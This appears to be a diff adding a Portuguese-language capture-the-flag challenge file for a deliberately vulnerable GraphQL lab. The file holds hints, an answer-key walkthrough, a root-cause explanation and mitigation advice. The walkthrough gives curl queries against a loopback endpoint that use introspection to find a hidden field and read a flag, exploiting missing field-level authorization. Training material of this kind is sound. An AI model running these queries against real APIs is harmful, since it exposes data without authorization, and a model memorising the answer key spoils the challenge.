@@ -1,0 +1,79 @@
+{
+  "slug": "api-graphql-field-auth",
+  "title": "Vazamento de campo no Ledgerlink",
+  "codename": "LEDGERLINK",
+  "summary": "Um gateway no estilo GraphQL aplica permissões em nível de objeto em registros financeiros, mas nunca verifica a autorização por campo de um campo sensível oculto. A introspection, somada ao comentário de debug, revela finance.flag, e o token de analyst consegue lê-lo.",
+  "category": "api",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "api-graphql-field-auth",
+  "estimated_minutes": 20,
+  "xp": 120,
+  "tech": [
+    "Flask",
+    "GraphQL",
+    "JSON API",
+    "Introspection"
+  ],
+  "tags": [
+    "graphql",
+    "field-level-authorization",
+    "introspection",
+    "api"
+  ],
+  "story": "O Ledgerlink expõe uma pequena API de grafo sobre registros financeiros. O gateway verifica corretamente que o analyst pode ler objetos financeiros, e o registro de tesouraria é legível. Mas o schema esconde um campo de diagnóstico em Finance que seu resolver ainda serve a quem o pedir. A introspection lista os campos visíveis; o oculto nunca saiu do type system.",
+  "objective": "Descubra o campo oculto no tipo Finance e consulte-o com o conjunto de permissões de analyst para ler a flag.",
+  "rules": "Permaneça na origem loopback atribuída. Apenas o endpoint GraphQL do lab está no escopo. Não escaneie outras portas.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag do campo de Finance",
+      "flag_type": "user",
+      "points": 120,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "A permissão de objeto não é a permissão de campo",
+      "body": "POST em `{\"query\": \"{ viewer { id name role finance { balance currency iban } } }\"}` funciona: `finance:read` está concedida. Uma consulta de objeto bem-sucedida não diz nada sobre os campos dentro dele. Percorra o schema e compare os campos documentados com o que os resolvers realmente têm."
+    },
+    {
+      "level": 2,
+      "title": "A introspection tem mais de uma visão",
+      "body": "`{\"query\":\"{ __schema { types { name } } }\"}` lista os tipos. Depois inspecione um único tipo com `__type(name: \"Finance\")`. O schema esconde diagnósticos por padrão; o próprio modo debug do gateway os expõe para o tipo Finance — veja como `__type` é tratado no servidor."
+    },
+    {
+      "level": 3,
+      "title": "Peça o campo oculto diretamente",
+      "body": "Oculto significa apenas ausente da visão padrão de introspection. O resolver de `finance` em um User ainda serve o campo. Consulte-o explicitamente sob `user(id: \"2\")` ou `finance(userId: \"2\")` — a entrada `requires` por campo nunca é aplicada."
+    }
+  ],
+  "solution": {
+    "walkthrough": "**1. Confirme a permissão de objeto.**\n\n```\ncurl -s http://127.0.0.1:<port>/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ user(id: \\\"2\\\") { id name role finance { balance iban } } }\"}'\n# {\"data\":{\"user\":{\"id\":\"2\",\"finance\":{\"balance\":920000.0,...}}}}\n```\n\n**2. Enumere o schema.**\n\n```\ncurl -s http://127.0.0.1:<port>/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ __schema { types { name } } }\"}'\n# Query, User, Finance\ncurl -s http://127.0.0.1:<port>/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ __type(name: \\\"Finance\\\") { name fields { name } } }\"}'\n# {\"data\":{\"__type\":{\"name\":\"Finance\",\"fields\":[{\"name\":\"balance\"}, ...]}}}\n```\n\nA visão de introspection filtra entradas com `if meta.get(\"hidden\") and not include_hidden: continue`. Esse filtro roda apenas durante a montagem da listagem do schema — é documentação, não controle de acesso. O resolver do campo nunca lê `meta.get(\"requires\")`, então ele serve o campo oculto a qualquer chamador que consiga resolver o objeto `Finance` pai.\n\n**3. Consulte o campo oculto.**\n\n```\ncurl -s http://127.0.0.1:<port>/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ finance(userId: \\\"2\\\") { balance flag } }\"}'\n# {\"data\":{\"finance\":{\"balance\":920000.0,\"flag\":\"RV{...}\"}}}\n```\n\nO mesmo funciona aninhado: `{ user(id: \"2\") { finance { flag } } }`. A response contém a flag e registra o objetivo.",
+    "root_cause": "A autorização foi implementada no nível do objeto (`este principal pode ler Finance?`) e esqueceu o nível do campo (`este principal pode ler Finance.flag?`). O resolver despacha pelo nome do campo solicitado e a anotação de schema `requires: finance:read` existe, mas nunca é consultada. Ocultar o campo da visão padrão de introspection é cosmético: a introspection é um recurso de documentação, não um controle de acesso, e o resolver ainda aceita o nome do campo. Qualquer API orientada por schema que calcula autorização apenas pelo tipo do objeto tem essa lacuna.",
+    "mitigation": "Aplique autorização por campo no resolver: leia os metadados `requires` do campo e verifique-os contra os escopos do chamador antes de retornar um valor, negando por padrão campos sem política. Mascaramento de campo no servidor (retornar null mais um erro) é o único controle confiável; ocultar campos no cliente e filtrar a introspection não são. Use uma biblioteca schema-first com diretivas por campo e um middleware de autorização que roda em toda folha, registre em log e alerte sobre campos negados, e adicione testes que requisitem todos os campos de todos os tipos com um token de baixo privilégio."
+  },
+  "references": [
+    {
+      "title": "OWASP GraphQL Cheat Sheet — Authorization",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Autorização por campo, exposição de introspection e controles no resolver."
+    },
+    {
+      "title": "OWASP API Security 2023 — A1: Broken Object Level Authorization",
+      "url": "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
+      "source_type": "standard",
+      "description": "Por que verificações em nível de objeto devem ser combinadas com verificações em nível de campo nos dados retornados."
+    },
+    {
+      "title": "OWASP WSTG — GraphQL testing",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL",
+      "source_type": "standard",
+      "description": "Consultas de introspection e metodologia de enumeração de campos ocultos."
+    }
+  ]
+}
